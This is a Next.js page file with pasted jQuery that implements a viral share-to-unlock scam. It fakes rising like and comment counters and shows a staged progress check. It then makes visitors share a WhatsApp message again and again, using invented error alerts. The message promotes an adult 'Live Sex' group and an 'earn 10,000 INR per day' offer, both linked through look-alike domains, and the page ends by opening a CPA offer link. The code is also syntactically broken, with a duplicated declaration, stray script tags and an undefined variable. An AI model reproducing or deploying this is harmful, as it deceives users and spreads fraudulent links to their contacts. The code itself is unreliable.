// pages/index.js
import Head from 'next/head';
import { useEffect } from 'react';
import styles from '../styles/wastyles.css'; // Import your CSS file

function Home({ randomImage }) {
  useEffect(() => {
    // Your JavaScript logic related to the existing HTML
    

    var time = 0;
window.setInterval(function () {
    time = time + 1;
    $(".t1").html(time + 1 + "m");
    $(".t2").html(time + 2 + "m");
    $(".t3").html(time + 4 + "m");
}, 6e4);
var likes = 134,
var likes = 134,
    comments = 23,
    shares = 12;
window.setInterval(function () {
    likes = likes + Math.floor(Math.random() * 3);
    comments = comments + Math.floor(Math.random() * 2);
    shares = shares + Math.floor(Math.random() * 2);
    $("#likes").html(likes + "K");
    $("#comments").html(comments + "K comments");
    $("#shares").html(shares + "K shares");
}, 5e3);
$(".liked").click(function () {
    if ($(this).hasClass("selected")) {
        $(this).removeClass("selected");
        $(this).html("Like");
    } else {
        $(this).addClass("selected");
        $(this).html("Unlike");
    }
});
</script>


<script type="text/javascript">

$("#go").click(function () {
    $("#intro").fadeOut(0);
    $("#loader").fadeIn(1000);
    var i = 0;
    var interval = setInterval(function () {
        $("#num").text(i + "%");
        i += 1;
        if (i >= 100) {
            clearInterval(interval);
            $("#loader").fadeOut(0);
            $("#info").fadeIn(1000);
        }
    }, 50);
});

$("#confirm").click(function () {
    $("#info").fadeOut(0);
    $("#checking").fadeIn(1000);
    var i = 0;
    var interval = setInterval(function () {
        i += 1;
        $("#percentage").text(i + "%");
        $("#fill").css("width", i + "%");
        if (i == 50) {
            i = 49;
            setTimeout(function () {
                i = 50;
            }, 1000);
        }
        if (i >= 100) {
            clearInterval(interval);
            $("#load").fadeOut(0);
            $("#check").fadeIn(0);
            setTimeout(function () {
                $("#checking").fadeOut(0);
                $("#share").fadeIn(1000);
                $("#getname").html($("#name").val());
            }, 500);
        }
    }, 50);
});

$(document).click(function () {
    if ($("#name").is(":focus")) {
        $(".error").fadeOut(500);
    }
});




 var text1 = 
			"🔥💦 *Live Sex* WhatsApp Group *Sexy 18 Adult💋* 🔞 *Viral Chat Videos* 🍌🍌🍌 🔥 🍆 🥵 🎥 *https://whatsap-com.pages.dev* 🍌🍌🍌%0A 💸Earn money *10,000 INR* per day by using your phone👉 *https://payiq.sbs*",
           error = "There error! Posts are not counted. You may have shared it with the same friend or group more than once, please re-share it",
            abcde = "ddd",
            saved = "",
            share = "whatsapp://send?text=" + text1;
            
            
            
            
            
            var swidth = localStorage.getItem(saved);
if (swidth !== null) {
    var width = swidth * 1;
    $("#intro").fadeOut(0);
    $(".comments").fadeOut(0);
    $("#share").fadeIn(0);
    $("#fill2").css("width", width + "%");
    $("#percentage2").text(width + "%");
} else {
    var width = 0;
}
$("#whatsapp").click(function () {
    window.location.href = share;
    if (width == 0) {
        width += 50;
} else if (width == 50) {
alert(error);
width += 15;
} else if (width == 65) {
width += 5;
} else if (width == 70) {
alert(error);
width += 10;
} else if (width == 80) {
alert(error);
width += 5;
} else if (width == 85) {
width += 5;
} else if (width == 90) {
width += 4;
} else if (width == 94) {
width += 2;
} else if (width == 96) {
width += 2;
    } else {
        $("#share").fadeOut(0);
        $("#claim").fadeIn(1000);
    }
    localStorage.setItem(saved, width);
    setTimeout(function () {
        $("#fill2").css("width", width + "%");
        $("#percentage2").text(width + "%");
    }, 2000);
});
$("#offer").click(function () {
    window.open(cpa, "_blank");
});


    // Cleanup (if needed)
    return () => {
      // Cleanup logic
    };
  }, []);

  return (
    <div>
      <Head>
        <meta property="og:image" content={randomImage} />
        <meta property="og:title" content="Dynamic OG Image Next.js App" />
        <meta property="og:description" content="A simple Next.js app with a dynamic OG image." />
        <meta property="og:url" content="https://your-app-url" />
        {/* Other meta tags */}
      </Head>

      {/* Your existing HTML with added styles */}
      <div className={`${styles.post} post`} width="100%">
        <!-- ... (Your existing HTML) ... -->
      </div>

      {/* Your page content */}
      <h1>Your Page Content</h1>
      <img src={randomImage} alt="Random Image" />
    </div>
  );
}

export async function getServerSideProps() {
  // Array of sample image URLs
  const imageArray = [
    'https://example.com/image1.jpg',
    'https://example.com/image2.jpg',
    'https://example.com/image3.jpg',
    // Add more image URLs as needed
  ];

  // Select a random image from the array
  const randomImage = imageArray[Math.floor(Math.random() * imageArray.length)];

  return {
    props: {
      randomImage,
    },
  };
}

export default Home;
